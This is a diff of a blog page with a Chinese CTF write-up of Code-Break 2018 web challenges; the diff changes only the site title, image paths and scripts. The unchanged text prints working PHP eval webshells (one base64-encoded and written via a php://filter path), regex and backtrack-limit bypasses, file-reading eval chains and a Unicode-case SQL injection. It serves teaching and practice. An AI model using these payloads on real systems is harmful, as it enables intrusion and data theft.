@@ -90,6 +90,17 @@
   };
 </script>
 
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
 
   
 
@@ -101,25 +112,25 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Code-Break-2018">
 <meta property="og:url" content="https://zo1ro.github.io/2018/12/30/code-break/index.html">
-<meta property="og:site_name" content="一个向往acm的ctf_dog">
+<meta property="og:site_name" content="ZO1RO">
 <meta property="og:description" content="前言年底了，来一发 Code-Break 入入魂。给无滋无味的预习增添一些色彩 膜了几位师傅的思路  let‘s go~！">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/4.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/2.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/1.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/3.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/8.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/6.png">
-<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/7.png">
-<meta property="og:updated_time" content="2019-05-08T15:25:59.336Z">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/4.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/2.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/1.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/3.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/8.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/6.png">
+<meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/7.png">
+<meta property="og:updated_time" content="2019-05-09T16:24:56.966Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Code-Break-2018">
 <meta name="twitter:description" content="前言年底了，来一发 Code-Break 入入魂。给无滋无味的预习增添一些色彩 膜了几位师傅的思路  let‘s go~！">
-<meta name="twitter:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/4.png">
+<meta name="twitter:image" content="https://zo1ro.github.io/2018/12/30/code-break/4.png">
 
 
 
-  <link rel="alternate" href="/atom.xml" title="一个向往acm的ctf_dog" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="ZO1RO" type="application/atom+xml">
 
 
 
@@ -135,7 +146,7 @@
   };
 </script>
 
-  <title>Code-Break-2018 | 一个向往acm的ctf_dog</title>
+  <title>Code-Break-2018 | ZO1RO</title>
   
 
 
@@ -194,10 +205,14 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">一个向往acm的ctf_dog</span>
+        <span class="site-title">ZO1RO</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
+    
+      
+        <p class="site-subtitle">一个向往acm的ctf_dog</p>
+      
     
     
   </div>
@@ -343,7 +358,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="一个向往acm的ctf_dog">
+      <meta itemprop="name" content="ZO1RO">
     </span>
 
     
@@ -380,22 +395,6 @@
               <time title="Created: 2018-12-30 20:16:02" itemprop="dateCreated datePublished" datetime="2018-12-30T20:16:02+08:00">2018-12-30</time>
             
 
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-05-08 23:25:59" itemprop="dateModified" datetime="2019-05-08T23:25:59+08:00">2019-05-08</time>
-              
             
           </span>
 
@@ -434,7 +433,7 @@
 <h2 id="0x1-easy-function"><a href="#0x1-easy-function" class="headerlink" title="0x1 easy_function"></a>0x1 easy_function</h2><p>源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题的思路在于不影响函数调用的情况下绕过正则，fuzz出 <code>%5c</code> 在字符前仍能进行调用，通过<code>$arg</code> 传入 <code>payload</code> </p>
-<p><img src="code-break/4.png" alt="4"></p>
+<p><img src="4.png" alt="4"></p>
 <p>参考</p>
 <p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?id=2;&#125;phpinfo();/*</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$str2=<span class="string">'echo  '</span>.$a.<span class="string">'test'</span>.$id.<span class="string">";"</span>;</span><br><span class="line">$f1 = create_function(<span class="string">'$a'</span>,$str2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">payload</span></span><br><span class="line"><span class="comment">id=2;&#125;phpinfo();//</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注入后代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>;&#125;</span><br><span class="line">  phpinfo();<span class="comment">//;//此处为注入代码。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -452,13 +451,13 @@
 <p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">深悉正则(pcre)最大回溯/递归限制</a></p>
 <p>php的 <code>preg_match</code>  设定了 <code>pcre.backtrack_limit</code> 。默认值大小为 <code>1000000</code></p>
 <p>超过这个值 <code>preg_match</code> 将返回 <code>false</code> 从而绕过正则匹配。</p>
-<p><img src="code-break\2.png" alt></p>
-<p><img src="code-break\1.png" alt></p>
+<p><img src="2.png" alt></p>
+<p><img src="1.png" alt></p>
 <p>生成payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//<span class="number">1.</span>py</span><br><span class="line">a=<span class="string">'&lt;?php @eval($_GET["cmd"]);//'</span>+<span class="string">"a"</span>*<span class="number">1000000</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//python <span class="number">1.</span>py &gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
 <p>上传拿 <code>shell</code></p>
 <p>（这里似乎后端设置了不可执行<code>system</code>，故上传<code>eval</code>）</p>
-<p><img src="code-break\3.png" alt></p>
+<p><img src="3.png" alt></p>
 <h2 id="0x3-easy-phpmagic"><a href="#0x3-easy-phpmagic" class="headerlink" title="0x3 easy-phpmagic"></a>0x3 easy-phpmagic</h2><p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//section1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//section2</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
@@ -473,7 +472,7 @@
 <p>最终构造payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: php</span><br><span class="line"></span><br><span class="line">domain=PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg&amp;log=://filter/write=convert.base64-decode/resource=shell.php/.</span><br></pre></td></tr></table></figure>
 <p>然后通过路径读取访问我们的shell</p>
-<p><img src="code-break\8.png" alt></p>
+<p><img src="8.png" alt></p>
 <h2 id="0x4-easy-phplimit"><a href="#0x4-easy-phplimit" class="headerlink" title="0x4 easy-phplimit"></a>0x4 easy-phplimit</h2><p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题和<code>RCTF 2018</code>的<code>r-cursive</code> 类似</p>
@@ -486,7 +485,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=var_dump(next(current(get_defined_vars())));&amp;1=print_r(scandir("/var/www/")); HTTP/1.1</span><br><span class="line"></span><br><span class="line">string(30) "print_r(scandir("/var/www/"));"</span><br></pre></td></tr></table></figure>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(next(current(get_defined_vars())));&amp;1=print_r(scandir("/var/www/")); HTTP/1.1</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; flag_phpbyp4ss</span><br><span class="line">    [3] =&gt; html</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(next(current(get_defined_vars())));&amp;1=print_r(file(&quot;/var/www/flag_phpbyp4ss&quot;)); HTTP/1.1</span><br></pre></td></tr></table></figure>
-<p><img src="code-break\6.png" alt></p>
+<p><img src="6.png" alt></p>
 <h2 id="0x5-easy-nodechr"><a href="#0x5-easy-nodechr" class="headerlink" title="0x5 easy-nodechr"></a>0x5 easy-nodechr</h2><p>源码</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">// initial libraries</span><br><span class="line">const Koa = require('koa')</span><br><span class="line">const sqlite = require('sqlite')</span><br><span class="line">const fs = require('fs')</span><br><span class="line">const views = require('koa-views')</span><br><span class="line">const Router = require('koa-router')</span><br><span class="line">const send = require('koa-send')</span><br><span class="line">const bodyParser = require('koa-bodyparser')</span><br><span class="line">const session = require('koa-session')</span><br><span class="line">const isString = require('underscore').isString</span><br><span class="line">const basename = require('path').basename</span><br><span class="line"></span><br><span class="line">const config = JSON.parse(fs.readFileSync('../config.json', &#123;encoding: 'utf-8', flag: 'r'&#125;))</span><br><span class="line"></span><br><span class="line">async function main() &#123;</span><br><span class="line">    const app = new Koa()</span><br><span class="line">    const router = new Router()</span><br><span class="line">    const db = await sqlite.open(':memory:')</span><br><span class="line"></span><br><span class="line">    await db.exec(`CREATE TABLE "main"."users" (</span><br><span class="line">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        "username" TEXT NOT NULL,</span><br><span class="line">        "password" TEXT,</span><br><span class="line">        CONSTRAINT "unique_username" UNIQUE ("username")</span><br><span class="line">    )`)</span><br><span class="line">    await db.exec(`CREATE TABLE "main"."flags" (</span><br><span class="line">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        "flag" TEXT NOT NULL</span><br><span class="line">    )`)</span><br><span class="line">    for (let user of config.users) &#123;</span><br><span class="line">        await db.run(`INSERT INTO "users"("username", "password") VALUES ('$&#123;user.username&#125;', '$&#123;user.password&#125;')`)</span><br><span class="line">    &#125;</span><br><span class="line">    await db.run(`INSERT INTO "flags"("flag") VALUES ('$&#123;config.flag&#125;')`)</span><br><span class="line"></span><br><span class="line">    router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + '/views', &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: 'underscore'</span><br><span class="line">        &#125;,</span><br><span class="line">        extension: 'html'</span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(3000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    if(ctx.method == 'POST') &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body['username'])</span><br><span class="line">        let password = safeKeyword(ctx.request.body['password'])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url('login')</span><br><span class="line">        if (username &amp;&amp; password) &#123;</span><br><span class="line">            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`)</span><br><span class="line"></span><br><span class="line">            if (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url('admin')</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        await ctx.render('index')</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function static(ctx, next) &#123;</span><br><span class="line">    await send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function admin(ctx, next) &#123;</span><br><span class="line">    if(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = 303</span><br><span class="line">        return ctx.redirect(ctx.router.url('login'))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    await ctx.render('admin', &#123;</span><br><span class="line">        'user': ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function source(ctx, next) &#123;</span><br><span class="line">    await send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 <h4 id="main-code"><a href="#main-code" class="headerlink" title="main code"></a>main code</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    if(ctx.method == 'POST') &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body['username'])</span><br><span class="line">        let password = safeKeyword(ctx.request.body['password'])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url('login')</span><br><span class="line">        if (username &amp;&amp; password) &#123;</span><br><span class="line">            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`)</span><br><span class="line"></span><br><span class="line">            if (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url('admin')</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        await ctx.render('index')</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -495,7 +494,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"ı".toUpperCase() == I</span><br><span class="line">"ſ".toUpperCase() == S</span><br><span class="line">"K".toLowerCase() == k</span><br></pre></td></tr></table></figure>
 <p>构造payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=' un%c4%b1on %c5%bfelect 1,(%c5%bfelect flag from flags),1'</span><br></pre></td></tr></table></figure>
-<p><img src="code-break\7.png" alt></p>
+<p><img src="7.png" alt></p>
 <p>参考链接</p>
 <p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p>
 <p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
@@ -531,7 +530,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/ctf/" rel="tag">📖ctf</a>
           
         </div>
       
@@ -553,6 +552,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/10/notes/" rel="prev" title="notes">
+                notes <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -621,7 +624,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -644,7 +647,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                    <span class="site-state-item-count">3</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -663,6 +668,32 @@
 
           
 
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ZO1RO" title="GitHub &rarr; https://github.com/ZO1RO" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:em8xcm93ZWJAMTYzLmNvbQo=" title="E-Mail &rarr; mailto:em8xcm93ZWJAMTYzLmNvbQo=" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
           
 
           
@@ -815,9 +846,18 @@
 
 
 
+  
+  
 
 
 
+  
+  
+
+
+
+  
+  
 
 
 
@@ -833,6 +873,18 @@
 
   
   <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_lines.min.js"></script>
+
+  
+  <script src="/lib/three/canvas_sphere.min.js"></script>
 
 
   
@@ -886,6 +938,13 @@
   
 
   
+  
+
+  
+  
+
+  
+
 
   
 
